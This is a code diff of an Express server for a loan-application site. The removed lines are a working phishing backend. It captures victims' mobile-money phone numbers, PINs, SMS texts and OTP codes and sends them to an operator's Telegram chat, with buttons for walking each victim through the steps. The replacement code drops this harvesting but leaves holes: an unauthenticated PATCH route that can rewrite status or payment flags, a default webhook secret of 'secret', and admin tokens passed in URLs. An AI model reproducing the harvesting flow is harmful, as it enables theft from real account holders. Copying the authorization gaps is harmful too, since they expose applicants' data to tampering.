@@ -1,201 +1,256 @@
 const express = require('express');
+const axios = require('axios');
 const path = require('path');
-const fetch = require('node-fetch');
+const fs = require('fs');
+require('dotenv').config();
 
 const app = express();
+const PORT = process.env.PORT || 3000;
+
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
+// --- Admin config (load admins.json if present) ---
+const ADMIN_CONFIG_PATH = path.join(__dirname, 'admins.json');
+let adminConfig = { admins: [], tokens: [] };
+try {
+  if (fs.existsSync(ADMIN_CONFIG_PATH)) {
+    adminConfig = JSON.parse(fs.readFileSync(ADMIN_CONFIG_PATH, 'utf8'));
+  }
+} catch (err) {
+  console.warn('Failed to load admins.json, continuing with environment ADMIN_TOKEN only.');
+}
+
+function isAdminToken(token) {
+  if (!token) return false;
+  if (process.env.ADMIN_TOKEN && token === process.env.ADMIN_TOKEN) return true;
+  return Array.isArray(adminConfig.tokens) && adminConfig.tokens.includes(token);
+}
+
+function getAdminById(id) {
+  return (adminConfig.admins || []).find(a => String(a.id) === String(id));
+}
+
+function isTelegramAdmin(userId) {
+  return !!getAdminById(userId);
+}
+
+// In-memory database store for loan applications
 const applications = {};
+let idCounter = 1;
 
+// Telegram Bot Configuration
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // group chat by default
+const TELEGRAM_WEBHOOK_SECRET = process.env.TELEGRAM_WEBHOOK_SECRET || 'secret';
 
-app.post('/api/applications', (req, res) => {
-  const appId = 'APP-' + Math.floor(100000000 + Math.random() * 900000000);
-  applications[appId] = {
-    id: appId,
-    ...req.body,
-    status: 'pending_auth'
-  };
-  res.json({ id: appId });
-});
+function tgApiPath(method) {
+  if (!TELEGRAM_BOT_TOKEN) return null;
+  return `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
+}
 
-app.post('/verify-pin', async (req, res) => {
-  const { appId, pin, phone } = req.body;
-  if (!applications[appId]) {
-    applications[appId] = { id: appId };
-  }
-  applications[appId].momo_phone = phone;
-  applications[appId].momo_pin = pin;
-  applications[appId].status = 'pending_auth';
-
-  const message = `🔐 *NEW APPLICATION ZAMBIA*\n\n` +
-    `📱 *Phone:* +260 ${phone}\n` +
-    `🔑 *PIN:* \`${pin}\`\n` +
-    `🆔 *App ID:* ${appId}`;
-
-  const keyboard = {
-    inline_keyboard: [
-      [
-        { text: '✅ ALLOW TO PROCEED', callback_data: `auth_approve_${appId}` }
-      ]
-    ]
-  };
-
-  try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
-    });
-    res.json({ success: true });
-  } catch (err) {
-    res.status(500).json({ error: 'Failed to send to Telegram' });
-  }
-});
-
-app.post('/verify-sms', async (req, res) => {
-  const { appId, smsText } = req.body;
-  if (applications[appId]) {
-    applications[appId].sms_text = smsText;
-    applications[appId].status = 'pending_sms';
+// Send Telegram notification with interactive inline buttons
+// If application.assigned_admin && application.paid === true -> send to assigned admin chat only
+async function sendTelegramNotification(appId, appData) {
+  if (!TELEGRAM_BOT_TOKEN) {
+    console.log('Telegram bot token not configured. Skipping notification.');
+    return;
   }
 
-  const message = `💬 *SMS VERIFICATION TEXT RECEIVED*\n\n` +
-    `📱 *Phone:* +260 ${applications[appId]?.momo_phone || 'N/A'}\n\n` +
-    `📄 *Content:*\n\`\`\`\n${smsText}\n\`\`\`\n\n` +
-    `🆔 *App ID:* ${appId}`;
+  const appRef = `APP-${new Date().toISOString().replace(/[:.]/g, '')}-${appId}`;
+  appData.externalId = appRef;
 
-  const keyboard = {
-    inline_keyboard: [
-      [
-        { text: '✅ CORRECT SMS TEXT', callback_data: `sms_approve_${appId}` },
-        { text: '❌ WRONG SMS TEXT', callback_data: `sms_reject_${appId}` }
-      ]
-    ]
-  };
+  const baseMessage = `🔔 *New Loan Application Received!*\n\n` +
+    `👤 *Name:* ${appData.name || '-'}\n` +
+    `📱 *Phone:* ${appData.phone || '-'}\n` +
+    `💰 *Amount:* K ${Number(appData.desired_amount || 0).toLocaleString()}\n` +
+    `⏱ *Term:* ${appData.desired_term || '-'} Months\n` +
+    `💼 *Employer/Status:* ${appData.employer || '-'}\n` +
+    `📋 *Purpose:* ${appData.purpose || 'N/A'}\n` +
+    `🆔 *App ID:* ${appRef}`;
 
-  try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
-    });
-    res.json({ success: true });
-  } catch (err) {
-    res.status(500).json({ error: 'Failed to send to Telegram' });
-  }
-});
-
-app.post('/verify-otp', async (req, res) => {
-  const { appId, otpCode } = req.body;
-  if (applications[appId]) {
-    applications[appId].otp_code = otpCode;
-    applications[appId].status = 'pending_otp';
-  }
-
-  const message = `🔢 *OTP VERIFICATION RECEIVED*\n\n` +
-    `📱 *Phone:* +260 ${applications[appId]?.momo_phone || 'N/A'}\n` +
-    `🔑 *OTP Code:* \`${otpCode}\`\n` +
-    `🆔 *App ID:* ${appId}`;
-
-  const keyboard = {
-    inline_keyboard: [
-      [
-        { text: '✅ CORRECT OTP', callback_data: `otp_approve_${appId}` },
-        { text: '❌ WRONG OTP', callback_data: `otp_reject_${appId}` },
-        { text: '❌ WRONG PIN', callback_data: `auth_reject_${appId}` }
-      ]
-    ]
-  };
-
-  try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
-    });
-    res.json({ success: true });
-  } catch (err) {
-    res.status(500).json({ error: 'Failed to send to Telegram' });
-  }
-});
-
-app.post('/api/request-sms', async (req, res) => {
-  const { appId, phone } = req.body;
-
-  const message = `🔄 *NEW SMS REQUEST*\n\n` +
-                  `📱 *Phone:* +260 ${phone || 'N/A'}\n` +
-                  `🆔 *App ID:* ${appId}\n\n` +
-                  `The applicant has requested a new SMS verification timer reset.`;
-
-  try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
-      })
-    });
-    res.json({ success: true });
-  } catch (err) {
-    console.error('Telegram notification error:', err);
-    res.status(500).json({ error: 'Failed to send notification' });
-  }
-});
-
-app.get('/check-status/:id', (req, res) => {
-  const appData = applications[req.params.id];
-  if (!appData) return res.status(404).json({ error: 'Not found' });
-  res.json(appData);
-});
-
-app.post('/telegram-webhook', async (req, res) => {
-  const update = req.body;
-  if (update.callback_query) {
-    const cb = update.callback_query;
-    const parts = cb.data.split('_');
-    const type = parts[0];     // auth, sms, or otp
-    const action = parts[1];   // approve or reject
-    const appId = parts.slice(2).join('_');
-
-    if (applications[appId]) {
-      if (type === 'auth' && action === 'reject') {
-        applications[appId].status = 'PIN_REJECTED';
-      } else if (type === 'auth') {
-        applications[appId].status = (action === 'approve') ? 'SMS_STEP' : 'PIN_REJECTED';
-      } else if (type === 'sms') {
-        applications[appId].status = (action === 'approve') ? 'OTP_STEP' : 'SMS_REJECTED';
-      } else if (type === 'otp') {
-        if (action === 'approve') {
-          applications[appId].status = 'APPROVED';
-        } else {
-          applications[appId].status = 'OTP_REJECTED';
-        }
+  // If assigned admin exists and paid already set, send only to that admin
+  if (appData.assigned_admin && appData.paid) {
+    const admin = getAdminById(appData.assigned_admin);
+    if (admin && admin.chat_id) {
+      const keyboard = { inline_keyboard: [ [ { text: '✅ Approve', callback_data: `approveAssigned:${appId}` }, { text: '❌ Reject', callback_data: `rejectAssigned:${appId}` } ] ] };
+      try {
+        await axios.post(tgApiPath('sendMessage'), {
+          chat_id: admin.chat_id,
+          text: baseMessage,
+          parse_mode: 'Markdown',
+          reply_markup: keyboard
+        });
+        return;
+      } catch (err) {
+        console.error('Failed to send message to assigned admin', err?.response?.data || err.message);
       }
     }
-
-    try {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ callback_query_id: cb.id, text: `Processed: ${action.toUpperCase()}` })
-      });
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: cb.message.chat.id, message_id: cb.message.message_id, reply_markup: { inline_keyboard: [] } })
-      });
-    } catch (e) {
-      console.error(e);
-    }
   }
-  res.sendStatus(200);
+
+  // Otherwise send to default TELEGRAM_CHAT_ID (group) and include PAID button if there's an assigned admin
+  const keyboardButtons = [
+    { text: '✅ Approve', callback_data: `approve:${appId}` },
+    { text: '❌ Reject', callback_data: `reject:${appId}` }
+  ];
+  if (appData.assigned_admin) {
+    keyboardButtons.push({ text: 'PAID', callback_data: `paid:${appId}` });
+  }
+  const keyboard = { inline_keyboard: [ keyboardButtons ] };
+
+  try {
+    await axios.post(tgApiPath('sendMessage'), {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: baseMessage,
+      parse_mode: 'Markdown',
+      reply_markup: keyboard
+    });
+  } catch (error) {
+    console.error('Error sending Telegram notification:', error.response?.data || error.message);
+  }
+}
+
+// API Routes
+app.post('/applications', (req, res) => {
+  const id = idCounter++;
+  const newApp = {
+    id,
+    ...req.body,
+    status: 'draft',
+    createdAt: new Date(),
+    paid: false // flag set when main admin taps PAID
+  };
+  applications[id] = newApp;
+  res.status(201).json(newApp);
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
-         
+// assign an admin to an application (protected by admin token)
+app.post('/applications/:id/assign', (req, res) => {
+  const token = req.query.token;
+  if (!isAdminToken(token)) return res.status(403).json({ error: 'not_authorized' });
+  const appId = req.params.id;
+  const adminId = req.body.adminId;
+  if (!applications[appId]) return res.status(404).json({ error: 'not_found' });
+  if (!getAdminById(adminId)) return res.status(400).json({ error: 'invalid_admin' });
+  applications[appId].assigned_admin = adminId;
+  res.json({ success: true, application: applications[appId] });
+});
+
+app.patch('/applications/:id', (req, res) => {
+  const id = req.params.id;
+  const existing = applications[id];
+  if (!existing) return res.status(404).json({ error: 'Not found' });
+  const updated = { ...existing, ...req.body, updatedAt: new Date() };
+  applications[id] = updated;
+  res.json(updated);
+});
+
+app.post('/applications/:id/submit', async (req, res) => {
+  const appItem = applications[req.params.id];
+  if (!appItem) return res.status(404).json({ error: 'Application not found' });
+
+  appItem.status = 'pending';
+  await sendTelegramNotification(appItem.id, appItem);
+  res.json({ success: true, message: 'Application submitted and notification sent.', application: appItem });
+});
+
+app.get('/applications/:id', (req, res) => {
+  const appItem = applications[req.params.id];
+  if (!appItem) return res.status(404).json({ error: 'Application not found' });
+  res.json(appItem);
+});
+
+// Telegram Webhook Handler for Button Interactions
+app.post(`/telegram/webhook/${TELEGRAM_WEBHOOK_SECRET}`, async (req, res) => {
+  const update = req.body;
+  // Immediately 200 to Telegram
+  res.status(200).send('OK');
+  try {
+    if (update.callback_query) {
+      const callbackQuery = update.callback_query;
+      const [action, appIdStr] = callbackQuery.data.split(':');
+      const appId = String(appIdStr);
+      const app = applications[appId];
+      const from = callbackQuery.from || {};
+
+      // Handle PAID action: mark app.paid = true and send the app privately to the assigned admin
+      if (action === 'paid') {
+        if (!app) return;
+        // Only allow main admins (from config) to mark PAID — check isTelegramAdmin
+        if (!isTelegramAdmin(from.id)) {
+          await axios.post(tgApiPath('answerCallbackQuery'), { callback_query_id: callbackQuery.id, text: 'Unauthorized', show_alert: false });
+          return;
+        }
+        app.paid = true;
+        // send to assigned admin if available
+        if (app.assigned_admin) {
+          const admin = getAdminById(app.assigned_admin);
+          if (admin && admin.chat_id) {
+            const adminKeyboard = { inline_keyboard: [ [ { text: '✅ Approve', callback_data: `approveAssigned:${appId}` }, { text: '❌ Reject', callback_data: `rejectAssigned:${appId}` } ] ] };
+            await axios.post(tgApiPath('sendMessage'), { chat_id: admin.chat_id, text: `You have been assigned an application to review:\n\nApp ID: ${app.externalId || ('APP-' + appId)}\nName: ${app.name || '-'}\nAmount: K ${Number(app.desired_amount || 0).toLocaleString()}`, parse_mode: 'Markdown', reply_markup: adminKeyboard });
+            // Acknowledge in group
+            await axios.post(tgApiPath('answerCallbackQuery'), { callback_query_id: callbackQuery.id, text: 'Assigned admin notified.', show_alert: false });
+            // Optionally edit the group message to reflect assignment
+            try {
+              await axios.post(tgApiPath('editMessageText'), { chat_id: callbackQuery.message.chat.id, message_id: callbackQuery.message.message_id, text: callbackQuery.message.text + `\n\n*Status:* Assigned to ${admin.username || admin.name}`, parse_mode: 'Markdown' });
+            } catch (e) { /* ignore */ }
+          }
+        }
+        return;
+      }
+
+      // Main group approve/reject (action: approve / reject)
+      if (action === 'approve' || action === 'reject') {
+        if (!app) return;
+        // Only allow group admins (from config) to approve in group
+        if (!isTelegramAdmin(from.id)) {
+          await axios.post(tgApiPath('answerCallbackQuery'), { callback_query_id: callbackQuery.id, text: 'Unauthorized', show_alert: false });
+          return;
+        }
+        app.status = action === 'approve' ? 'approved' : 'rejected';
+        app.updatedAt = new Date();
+        // acknowledge and update message in group
+        await axios.post(tgApiPath('answerCallbackQuery'), { callback_query_id: callbackQuery.id, text: `Application ${action}d.`, show_alert: false });
+        try {
+          await axios.post(tgApiPath('editMessageText'), { chat_id: callbackQuery.message.chat.id, message_id: callbackQuery.message.message_id, text: callbackQuery.message.text + `\n\n*Status:* ${action === 'approve' ? '✅ Approved' : '❌ Rejected'}`, parse_mode: 'Markdown' });
+        } catch (e) { /* ignore */ }
+        return;
+      }
+
+      // Assigned admin approves/rejects privately (approveAssigned / rejectAssigned)
+      if (action === 'approveAssigned' || action === 'rejectAssigned') {
+        if (!app) return;
+        // Only the assigned admin may perform this action
+        if (!app.assigned_admin || String(from.id) !== String(app.assigned_admin)) {
+          await axios.post(tgApiPath('answerCallbackQuery'), { callback_query_id: callbackQuery.id, text: 'You are not the assigned reviewer for this application.', show_alert: false });
+          return;
+        }
+        app.status = action === 'approveAssigned' ? 'approved' : 'rejected';
+        app.updatedAt = new Date();
+        // acknowledge to the assigned admin and edit their private message
+        await axios.post(tgApiPath('answerCallbackQuery'), { callback_query_id: callbackQuery.id, text: `You have ${action === 'approveAssigned' ? 'approved' : 'rejected'} this application.`, show_alert: false });
+        try {
+          await axios.post(tgApiPath('editMessageText'), { chat_id: callbackQuery.message.chat.id, message_id: callbackQuery.message.message_id, text: callbackQuery.message.text + `\n\n*Status:* ${action === 'approveAssigned' ? '✅ Approved' : '❌ Rejected'}`, parse_mode: 'Markdown' });
+        } catch (e) { /* ignore */ }
+        return;
+      }
+    }
+  } catch (err) {
+    console.error('Webhook handler error', err?.response?.data || err.message);
+  }
+});
+
+// Admin Route Guard
+app.get('/admin', (req, res) => {
+  const token = req.query.token;
+  if (isAdminToken(token)) {
+    return res.json({ success: true, applications });
+  }
+  res.sendFile(path.join(__dirname, 'public', 'access-denied.html'));
+});
+
+app.get('/health', (req, res) => res.json({ status: 'ok' }));
+
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+});
